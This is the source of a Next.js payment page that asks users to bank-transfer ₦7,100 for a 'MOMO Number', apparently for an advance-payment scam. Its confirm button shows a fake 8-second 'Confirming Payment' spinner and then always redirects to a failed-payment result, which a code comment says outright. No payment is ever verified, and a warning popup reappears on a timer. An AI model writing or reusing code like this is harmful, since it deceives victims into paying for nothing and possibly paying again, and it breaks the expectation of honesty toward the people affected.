"use client"

import type React from "react"

import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import Link from "next/link"
import { Button } from "@/components/ui/button"
import { Copy, Check, Lightbulb, Hash, Landmark, User2, X } from "lucide-react"
import { useToast } from "@/hooks/use-toast"
import { OpayWarningPopup } from "@/components/opay-warning-popup" // Import OpayWarningPopup
import { getPaymentAccountDetails } from "@/lib/payment-account-details"
import { safeParse } from "@/lib/safe-storage";

export default function PaymentPage() {
  const router = useRouter()
  const { toast } = useToast()
  const [formData, setFormData] = useState<any>(null)

  const [copiedAccount, setCopiedAccount] = useState(false)
  const [copiedNumber, setCopiedNumber] = useState(false)
  const [isConfirming, setIsConfirming] = useState(false)
  const [showOpayWarning, setShowOpayWarning] = useState(true)
  // Modified: Track last popup show time to enforce 10-second interval between appearances
  const lastPopupShowRef = useRef<number>(Date.now())

  useEffect(() => {
    // Check if form data exists
    const storedFormData = localStorage.getItem("momo-credit-momo-number-form")

    if (!storedFormData) {
      router.push("/buy-momo-number")
      return
    }

    setFormData(safeParse(storedFormData, null))
    setShowOpayWarning(true) // Show warning when page loads
    
    // Modified: Schedule next popup appearance after 10 seconds
    const popupTimer = setTimeout(() => {
      setShowOpayWarning(true)
      lastPopupShowRef.current = Date.now()
    }, 10000) // 10-second interval between appearances
    
    return () => clearTimeout(popupTimer)
  }, [router])

  if (!formData) {
    return <div className="p-6 text-center">Loading...</div>
  }

  const accountDetails = getPaymentAccountDetails({ useCase: "momo" })
  const bankDetails = {
    ...accountDetails,
    amount: 7100,
  }

  const handleCopy = (text: string, setter: React.Dispatch<React.SetStateAction<boolean>>) => {
    navigator.clipboard.writeText(text)
    setter(true)
    toast({
      title: "Copied!",
      description: `${text} copied to clipboard.`,
    })
    setTimeout(() => setter(false), 2000)
  }

  const handleConfirmPayment = () => {
    setIsConfirming(true)
    setTimeout(() => {
      // Redirect to the new payment result page (which will always show failure)
      router.push(`/buy-momo-number/payment-result?status=failed&amount=${bankDetails.amount}`)
    }, 8000) // 8 seconds loading
  }

  const formatCurrencyNaira = (amount: number) => {
    return new Intl.NumberFormat("en-NG", {
      style: "currency",
      currency: "NGN",
      minimumFractionDigits: 0,
      maximumFractionDigits: 0,
    })
      .format(amount)
      .replace("NGN", "₦")
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col items-center">
      {/* Header */}
      <div className="w-full max-w-md bg-white shadow-sm p-4 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Link href="/buy-momo-number">
            <Button variant="ghost" size="icon" className="h-8 w-8">
              <X className="h-4 w-4" />
            </Button>
          </Link>
          <h1 className="text-lg font-semibold text-gray-800">Pay for MOMO Number</h1>
        </div>
        <div className="flex items-center gap-2">
          <span className="text-lg font-bold text-orange-600">{formatCurrencyNaira(bankDetails.amount)}</span>
        </div>
      </div>

      {/* Main Content Area */}
      <div className="flex-1 w-full max-w-md p-4 flex flex-col">
        <div className="text-center mb-4">
          <div className="w-16 h-16 rounded-full bg-blue-500 flex items-center justify-center mx-auto mb-2">
            <div className="w-8 h-8 rounded-full bg-orange-400"></div>
          </div>
          <p className="text-gray-600 text-sm">Complete this bank transfer to proceed</p>
        </div>

        {/* Bank Details Card */}
        <div className="bg-white rounded-xl p-5 shadow-md mb-6">
          <div className="space-y-4">
            <div className="flex justify-between items-center">
              <div className="flex flex-col">
                <span className="text-gray-600 text-xs">Amount</span>
                <span className="text-lg font-bold text-gray-800">{formatCurrencyNaira(bankDetails.amount)}</span>
              </div>
            </div>

            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Hash className="h-4 w-4 text-gray-500" />
                <div className="flex flex-col">
                  <span className="text-gray-600 text-xs">Account Number</span>
                  <span className="font-medium text-gray-800">{bankDetails.accountNumber}</span>
                </div>
              </div>
              <Button
                variant="ghost"
                size="icon"
                onClick={() => handleCopy(bankDetails.accountNumber, setCopiedNumber)}
                className="h-8 w-8 rounded-full"
              >
                {copiedNumber ? <Check className="h-4 w-4 text-green-500" /> : <Copy className="h-4 w-4" />}
              </Button>
            </div>

            <div className="flex items-center gap-2">
              <Landmark className="h-4 w-4 text-gray-500" />
              <div className="flex flex-col">
                <span className="text-gray-600 text-xs">Bank Name</span>
                <span className="font-medium text-gray-800">{bankDetails.bankName}</span>
              </div>
            </div>

            <div className="flex items-center gap-2">
              <User2 className="h-4 w-4 text-gray-500" />
              <div className="flex flex-col">
                <span className="text-gray-600 text-xs">Account Name</span>
                <span className="font-medium text-gray-800">{bankDetails.accountName}</span>
              </div>
            </div>
          </div>
        </div>

        {/* Payment Instructions Box */}
        <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-6 flex items-start gap-3">
          <Lightbulb className="h-5 w-5 text-blue-600 flex-shrink-0 mt-0.5" />
          <div>
            <h3 className="font-semibold text-blue-800 text-sm mb-1">Payment Instructions</h3>
            <p className="text-blue-700 text-xs leading-relaxed">
              Complete the bank transfer to generate your MOMO Number. Your MOMO Number will be sent to your WhatsApp
              number within 5-10 minutes after payment confirmation.
            </p>
          </div>
        </div>

        {/* Confirm Button */}
        <Button
          onClick={handleConfirmPayment}
          disabled={isConfirming}
          className="w-full bg-orange-600 hover:bg-orange-700 text-white font-semibold py-4 rounded-xl transition-colors duration-300 text-lg"
        >
          {isConfirming ? (
            <span className="flex items-center">
              <svg className="animate-spin h-5 w-5 mr-3 text-white" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path
                  className="opacity-75"
                  fill="currentColor"
                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                ></path>
              </svg>
              Confirming Payment...
            </span>
          ) : (
            "I have made this bank Transfer"
          )}
        </Button>
      </div>

      {/* Modified: Opay Warning Popup with 10-second interval enforcement */}
      {showOpayWarning && (
        <OpayWarningPopup 
          onClose={() => {
            setShowOpayWarning(false)
            lastPopupShowRef.current = Date.now()
          }} 
        />
      )}
    </div>
  )
}
